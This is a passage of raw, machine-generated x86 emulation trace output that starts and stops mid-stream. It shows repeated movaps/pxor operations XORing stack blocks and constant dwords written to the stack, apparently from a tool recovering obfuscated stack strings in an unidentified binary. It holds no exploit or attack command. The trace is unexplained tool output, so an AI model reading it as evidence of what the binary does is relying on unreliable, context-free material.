0x10000 0x405f2e: pxor xmm1, xmmword ptr [esp + 0xff0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ff0 for stack size 0x10000 0x405f37: movaps xmmword ptr [esp + 0x2320], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa320 for stack size 0x10000 saving data to stack: 0 16 0x405f3f: movaps xmm1, xmmword ptr [esp + 0x2330], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa330 for stack size 0x10000 0x405f47: pxor xmm1, xmmword ptr [esp + 0x1000], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9000 for stack size 0x10000 0x405f50: movaps xmmword ptr [esp + 0x2330], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa330 for stack size 0x10000 saving data to stack: 0 16 0x405f58: movaps xmm1, xmmword ptr [esp + 0x2340], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa340 for stack size 0x10000 0x405f60: pxor xmm1, xmmword ptr [esp + 0x1010], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9010 for stack size 0x10000 0x405f69: movaps xmmword ptr [esp + 0x2340], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa340 for stack size 0x10000 saving data to stack: 0 16 0x405f71: movaps xmm1, xmmword ptr [esp + 0x2350], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa350 for stack size 0x10000 0x405f79: pxor xmm1, xmmword ptr [esp + 0x1020], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9020 for stack size 0x10000 0x405f82: movaps xmmword ptr [esp + 0x2350], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa350 for stack size 0x10000 saving data to stack: 0 16 0x405f8a: movaps xmm1, xmmword ptr [esp + 0x2360], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa360 for stack size 0x10000 0x405f92: pxor xmm1, xmmword ptr [esp + 0x1030], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9030 for stack size 0x10000 0x405f9b: movaps xmmword ptr [esp + 0x2360], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa360 for stack size 0x10000 saving data to stack: 0 16 0x405fa3: movaps xmm1, xmmword ptr [esp + 0x2370], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa370 for stack size 0x10000 0x405fab: pxor xmm1, xmmword ptr [esp + 0x1040], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9040 for stack size 0x10000 0x405fb4: movaps xmmword ptr [esp + 0x2370], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa370 for stack size 0x10000 saving data to stack: 0 16 0x405fbc: movaps xmm1, xmmword ptr [esp + 0x2380], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa380 for stack size 0x10000 0x405fc4: pxor xmm1, xmmword ptr [esp + 0x1050], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9050 for stack size 0x10000 0x405fcd: movaps xmmword ptr [esp + 0x2380], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa380 for stack size 0x10000 saving data to stack: 0 16 0x405fd5: movaps xmm1, xmmword ptr [esp + 0x2390], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa390 for stack size 0x10000 0x405fdd: pxor xmm1, xmmword ptr [esp + 0x1060], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9060 for stack size 0x10000 0x405fe6: movaps xmmword ptr [esp + 0x2390], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa390 for stack size 0x10000 saving data to stack: 0 16 0x405fee: movaps xmm1, xmmword ptr [esp + 0x23a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa3a0 for stack size 0x10000 0x405ff6: pxor xmm1, xmmword ptr [esp + 0x1070], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9070 for stack size 0x10000 0x405fff: movaps xmmword ptr [esp + 0x23a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa3a0 for stack size 0x10000 saving data to stack: 0 16 0x406007: movaps xmm1, xmmword ptr [esp + 0x23b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa3b0 for stack size 0x10000 0x40600f: pxor xmm1, xmmword ptr [esp + 0x1080], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9080 for stack size 0x10000 0x406018: movaps xmmword ptr [esp + 0x23b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa3b0 for stack size 0x10000 saving data to stack: 0 16 0x406020: movaps xmm1, xmmword ptr [esp + 0x23c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa3c0 for stack size 0x10000 0x406028: pxor xmm1, xmmword ptr [esp + 0x1090], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9090 for stack size 0x10000 0x406031: movaps xmmword ptr [esp + 0x23c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa3c0 for stack size 0x10000 saving data to stack: 0 16 0x406039: movaps xmm1, xmmword ptr [esp + 0x23d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa3d0 for stack size 0x10000 0x406041: pxor xmm1, xmmword ptr [esp + 0x10a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x90a0 for stack size 0x10000 0x40604a: movaps xmmword ptr [esp + 0x23d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa3d0 for stack size 0x10000 saving data to stack: 0 16 0x406052: movaps xmm1, xmmword ptr [esp + 0x23e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa3e0 for stack size 0x10000 0x40605a: pxor xmm1, xmmword ptr [esp + 0x10b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x90b0 for stack size 0x10000 0x406063: movaps xmmword ptr [esp + 0x23e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa3e0 for stack size 0x10000 saving data to stack: 0 16 0x40606b: movaps xmm1, xmmword ptr [esp + 0x23f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa3f0 for stack size 0x10000 0x406073: pxor xmm1, xmmword ptr [esp + 0x10c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x90c0 for stack size 0x10000 0x40607c: movaps xmmword ptr [esp + 0x23f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa3f0 for stack size 0x10000 saving data to stack: 0 16 0x406084: movaps xmm1, xmmword ptr [esp + 0x2400], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa400 for stack size 0x10000 0x40608c: pxor xmm1, xmmword ptr [esp + 0x10d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x90d0 for stack size 0x10000 0x406095: movaps xmmword ptr [esp + 0x2400], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa400 for stack size 0x10000 saving data to stack: 0 16 0x40609d: movaps xmm1, xmmword ptr [esp + 0x2410], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa410 for stack size 0x10000 0x4060a5: pxor xmm1, xmmword ptr [esp + 0x10e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x90e0 for stack size 0x10000 0x4060ae: movaps xmmword ptr [esp + 0x2410], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa410 for stack size 0x10000 saving data to stack: 0 16 0x4060b6: movaps xmm1, xmmword ptr [esp + 0x2420], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa420 for stack size 0x10000 0x4060be: pxor xmm1, xmmword ptr [esp + 0x10f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x90f0 for stack size 0x10000 0x4060c7: movaps xmmword ptr [esp + 0x2420], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa420 for stack size 0x10000 saving data to stack: 0 16 0x4060cf: movaps xmm1, xmmword ptr [esp + 0x2430], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa430 for stack size 0x10000 0x4060d7: pxor xmm1, xmmword ptr [esp + 0x1100], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9100 for stack size 0x10000 0x4060e0: movaps xmmword ptr [esp + 0x2430], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa430 for stack size 0x10000 saving data to stack: 0 16 0x4060e8: movaps xmm1, xmmword ptr [esp + 0x2440], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa440 for stack size 0x10000 0x4060f0: pxor xmm1, xmmword ptr [esp + 0x1110], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9110 for stack size 0x10000 0x4060f9: movaps xmmword ptr [esp + 0x2440], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa440 for stack size 0x10000 saving data to stack: 0 16 0x406101: movaps xmm1, xmmword ptr [esp + 0x2450], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa450 for stack size 0x10000 0x406109: pxor xmm1, xmmword ptr [esp + 0x1120], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9120 for stack size 0x10000 0x406112: movaps xmmword ptr [esp + 0x2450], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa450 for stack size 0x10000 saving data to stack: 0 16 0x40611a: movaps xmm1, xmmword ptr [esp + 0x2460], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa460 for stack size 0x10000 0x406122: pxor xmm1, xmmword ptr [esp + 0x1130], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9130 for stack size 0x10000 0x40612b: movaps xmmword ptr [esp + 0x2460], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa460 for stack size 0x10000 saving data to stack: 0 16 0x406133: movaps xmm1, xmmword ptr [esp + 0x2470], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa470 for stack size 0x10000 0x40613b: pxor xmm1, xmmword ptr [esp + 0x1140], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9140 for stack size 0x10000 0x406144: movaps xmmword ptr [esp + 0x2470], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa470 for stack size 0x10000 saving data to stack: 0 16 0x40614c: movaps xmm1, xmmword ptr [esp + 0x2480], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa480 for stack size 0x10000 0x406154: pxor xmm1, xmmword ptr [esp + 0x1150], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9150 for stack size 0x10000 0x40615d: movaps xmmword ptr [esp + 0x2480], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa480 for stack size 0x10000 saving data to stack: 0 16 0x406165: movaps xmm1, xmmword ptr [esp + 0x2490], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa490 for stack size 0x10000 0x40616d: pxor xmm1, xmmword ptr [esp + 0x1160], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9160 for stack size 0x10000 0x406176: movaps xmmword ptr [esp + 0x2490], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa490 for stack size 0x10000 saving data to stack: 0 16 0x40617e: movaps xmm1, xmmword ptr [esp + 0x24a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa4a0 for stack size 0x10000 0x406186: pxor xmm1, xmmword ptr [esp + 0x1170], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9170 for stack size 0x10000 0x40618f: movaps xmmword ptr [esp + 0x24a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa4a0 for stack size 0x10000 saving data to stack: 0 16 0x406197: movaps xmm1, xmmword ptr [esp + 0x24b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa4b0 for stack size 0x10000 0x40619f: pxor xmm1, xmmword ptr [esp + 0x1180], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9180 for stack size 0x10000 0x4061a8: movaps xmmword ptr [esp + 0x24b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa4b0 for stack size 0x10000 saving data to stack: 0 16 0x4061b0: movaps xmm1, xmmword ptr [esp + 0x24c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa4c0 for stack size 0x10000 0x4061b8: pxor xmm1, xmmword ptr [esp + 0x1190], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9190 for stack size 0x10000 0x4061c1: movaps xmmword ptr [esp + 0x24c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa4c0 for stack size 0x10000 saving data to stack: 0 16 0x4061c9: movaps xmm1, xmmword ptr [esp + 0x24d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa4d0 for stack size 0x10000 0x4061d1: pxor xmm1, xmmword ptr [esp + 0x11a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x91a0 for stack size 0x10000 0x4061da: movaps xmmword ptr [esp + 0x24d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa4d0 for stack size 0x10000 saving data to stack: 0 16 0x4061e2: movaps xmm1, xmmword ptr [esp + 0x24e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa4e0 for stack size 0x10000 0x4061ea: pxor xmm1, xmmword ptr [esp + 0x11b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x91b0 for stack size 0x10000 0x4061f3: movaps xmmword ptr [esp + 0x24e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa4e0 for stack size 0x10000 saving data to stack: 0 16 0x4061fb: movaps xmm1, xmmword ptr [esp + 0x24f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa4f0 for stack size 0x10000 0x406203: pxor xmm1, xmmword ptr [esp + 0x11c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x91c0 for stack size 0x10000 0x40620c: movaps xmmword ptr [esp + 0x24f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa4f0 for stack size 0x10000 saving data to stack: 0 16 0x406214: movaps xmm1, xmmword ptr [esp + 0x2500], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa500 for stack size 0x10000 0x40621c: pxor xmm1, xmmword ptr [esp + 0x11d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x91d0 for stack size 0x10000 0x406225: movaps xmmword ptr [esp + 0x2500], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa500 for stack size 0x10000 saving data to stack: 0 16 0x40622d: movaps xmm1, xmmword ptr [esp + 0x2510], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa510 for stack size 0x10000 0x406235: pxor xmm1, xmmword ptr [esp + 0x11e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x91e0 for stack size 0x10000 0x40623e: movaps xmmword ptr [esp + 0x2510], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa510 for stack size 0x10000 saving data to stack: 0 16 0x406246: movaps xmm1, xmmword ptr [esp + 0x2520], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa520 for stack size 0x10000 0x40624e: pxor xmm1, xmmword ptr [esp + 0x11f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x91f0 for stack size 0x10000 0x406257: movaps xmmword ptr [esp + 0x2520], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa520 for stack size 0x10000 saving data to stack: 0 16 0x40625f: movaps xmm1, xmmword ptr [esp + 0x2530], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa530 for stack size 0x10000 0x406267: pxor xmm1, xmmword ptr [esp + 0x1200], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9200 for stack size 0x10000 0x406270: movaps xmmword ptr [esp + 0x2530], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa530 for stack size 0x10000 saving data to stack: 0 16 0x406278: movaps xmm1, xmmword ptr [esp + 0x2540], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa540 for stack size 0x10000 0x406280: pxor xmm1, xmmword ptr [esp + 0x1210], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9210 for stack size 0x10000 0x406289: movaps xmmword ptr [esp + 0x2540], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa540 for stack size 0x10000 saving data to stack: 0 16 0x406291: movaps xmm1, xmmword ptr [esp + 0x2550], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa550 for stack size 0x10000 0x4062a0: pxor xmm1, xmmword ptr [esp + 0x1220], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9220 for stack size 0x10000 0x4062a9: mov ecx, 0x4f06e0, regs_read: (), regs_write: [22] 0x4062ae: movaps xmmword ptr [esp + 0x2550], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa550 for stack size 0x10000 saving data to stack: 0 16 0x4062b6: movaps xmm1, xmmword ptr [esp + 0x2560], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa560 for stack size 0x10000 0x4062be: pxor xmm1, xmmword ptr [esp + 0x1230], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9230 for stack size 0x10000 0x4062c7: movaps xmmword ptr [esp + 0x2560], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa560 for stack size 0x10000 saving data to stack: 0 16 0x4062cf: movaps xmm1, xmmword ptr [esp + 0x2570], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa570 for stack size 0x10000 0x4062d7: pxor xmm1, xmmword ptr [esp + 0x1240], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9240 for stack size 0x10000 0x4062e0: movaps xmmword ptr [esp + 0x2570], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa570 for stack size 0x10000 saving data to stack: 0 16 0x4062e8: movaps xmm1, xmmword ptr [esp + 0x2580], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa580 for stack size 0x10000 0x4062f0: pxor xmm1, xmmword ptr [esp + 0x1250], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9250 for stack size 0x10000 0x4062f9: movaps xmmword ptr [esp + 0x2580], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa580 for stack size 0x10000 saving data to stack: 0 16 0x406301: movaps xmm1, xmmword ptr [esp + 0x2590], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa590 for stack size 0x10000 0x406309: pxor xmm1, xmmword ptr [esp + 0x1260], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9260 for stack size 0x10000 0x406312: movaps xmmword ptr [esp + 0x2590], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa590 for stack size 0x10000 saving data to stack: 0 16 0x40631a: movaps xmm1, xmmword ptr [esp + 0x25a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa5a0 for stack size 0x10000 0x406322: pxor xmm1, xmmword ptr [esp + 0x1270], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9270 for stack size 0x10000 0x40632b: movaps xmmword ptr [esp + 0x25a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa5a0 for stack size 0x10000 saving data to stack: 0 16 0x406333: movaps xmm1, xmmword ptr [esp + 0x25b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa5b0 for stack size 0x10000 0x40633b: pxor xmm1, xmmword ptr [esp + 0x1280], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9280 for stack size 0x10000 0x406344: movaps xmmword ptr [esp + 0x25b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa5b0 for stack size 0x10000 saving data to stack: 0 16 0x40634c: movaps xmm1, xmmword ptr [esp + 0x25c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa5c0 for stack size 0x10000 0x406354: pxor xmm1, xmmword ptr [esp + 0x1290], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9290 for stack size 0x10000 0x40635d: movaps xmmword ptr [esp + 0x25c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa5c0 for stack size 0x10000 saving data to stack: 0 16 0x406365: movaps xmm1, xmmword ptr [esp + 0x25d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa5d0 for stack size 0x10000 0x40636d: pxor xmm1, xmmword ptr [esp + 0x12a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x92a0 for stack size 0x10000 0x406376: movaps xmmword ptr [esp + 0x25d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa5d0 for stack size 0x10000 saving data to stack: 0 16 0x40637e: movaps xmm1, xmmword ptr [esp + 0x25e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa5e0 for stack size 0x10000 0x406386: pxor xmm1, xmmword ptr [esp + 0x12b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x92b0 for stack size 0x10000 0x40638f: movaps xmmword ptr [esp + 0x25e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa5e0 for stack size 0x10000 saving data to stack: 0 16 0x406397: movaps xmm1, xmmword ptr [esp + 0x25f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa5f0 for stack size 0x10000 0x40639f: pxor xmm1, xmmword ptr [esp + 0x12c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x92c0 for stack size 0x10000 0x4063a8: movaps xmmword ptr [esp + 0x25f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa5f0 for stack size 0x10000 saving data to stack: 0 16 0x4063b0: movaps xmm1, xmmword ptr [esp + 0x2600], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa600 for stack size 0x10000 0x4063b8: pxor xmm1, xmmword ptr [esp + 0x12d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x92d0 for stack size 0x10000 0x4063c1: movaps xmmword ptr [esp + 0x2600], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa600 for stack size 0x10000 saving data to stack: 0 16 0x4063c9: movaps xmm1, xmmword ptr [esp + 0x2610], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa610 for stack size 0x10000 0x4063d1: pxor xmm1, xmmword ptr [esp + 0x12e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x92e0 for stack size 0x10000 0x4063da: movaps xmmword ptr [esp + 0x2610], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa610 for stack size 0x10000 saving data to stack: 0 16 0x4063e2: movaps xmm1, xmmword ptr [esp + 0x2620], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa620 for stack size 0x10000 0x4063ea: pxor xmm1, xmmword ptr [esp + 0x12f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x92f0 for stack size 0x10000 0x4063f3: movaps xmmword ptr [esp + 0x2620], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa620 for stack size 0x10000 saving data to stack: 0 16 0x4063fb: movaps xmm1, xmmword ptr [esp + 0x2630], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa630 for stack size 0x10000 0x406403: pxor xmm1, xmmword ptr [esp + 0x1300], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9300 for stack size 0x10000 0x40640c: movaps xmmword ptr [esp + 0x2630], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa630 for stack size 0x10000 saving data to stack: 0 16 0x406414: movaps xmm1, xmmword ptr [esp + 0x2640], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa640 for stack size 0x10000 0x40641c: pxor xmm1, xmmword ptr [esp + 0x1310], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9310 for stack size 0x10000 0x406425: movaps xmmword ptr [esp + 0x2640], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa640 for stack size 0x10000 saving data to stack: 0 16 0x40642d: movaps xmm1, xmmword ptr [esp + 0x2650], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa650 for stack size 0x10000 0x406435: pxor xmm1, xmmword ptr [esp + 0x1320], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9320 for stack size 0x10000 0x40643e: push eax, regs_read: [30, 19], regs_write: [30] 0x40643f: movaps xmmword ptr [esp + 0x2654], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0xa654 for stack size 0x10000 saving data to stack: 0 16 0x40644c: push 0x4c7d76, regs_read: [30], regs_write: [30] 0x406456: pop ecx, regs_read: [30], regs_write: [30, 22] 0x406457: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x406459: pop ebp, regs_read: [30], regs_write: [30, 20] 0x40645b: push ebp, regs_read: [30, 20], regs_write: [30] 0x40645c: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x406464: mov dword ptr [esp], 0x53f5fbe5, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 saving data to stack: 1408629733 4 0x40646e: mov dword ptr [esp + 4], 0x38063cb8, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8004 for stack size 0x10000 saving data to stack: 939932856 4 0x406476: mov ecx, 0x4f07dc, regs_read: (), regs_write: [22] 0x40647b: mov dword ptr [esp + 8], 0x5b0c9a5e, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 saving data to stack: 1527552606 4 0x406483: mov dword ptr [esp + 0xc], 0x33b887f0, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 saving data to stack: 867731440 4 0x40648b: mov dword ptr [esp + 0x10], 0x1a28f164, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 saving data to stack: 438890852 4 0x406493: mov dword ptr [esp + 0x14], 0xf78fe96a, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8014 for stack size 0x10000 saving data to stack: 4153403754 4 0x40649b: mov dword ptr [esp + 0x18], 0x56d7055c, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8018 for stack size 0x10000 saving data to stack: 1456932188 4 0x4064a3: mov dword ptr [esp + 0x1c], 0x4a0945d5, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x801c for stack size 0x10000 saving data to stack: 1242121685 4 0x4064ab: mov dword ptr [esp + 0x20], 0x46981409, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8020 for stack size 0x10000 saving data to stack: 1184371721 4 0x4064b3: mov dword ptr [esp + 0x24], 0x219f0074, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8024 for stack size 0x10000 saving data to stack: 564068468 4 0x4064bb: mov dword ptr [esp + 0x28], 0xc4599fdd, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8028 for stack size 0x10000 saving data to stack: 3294207965 4 0x4064c3: mov dword ptr [esp + 0x2c], 0x299615b3, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x802c for stack size 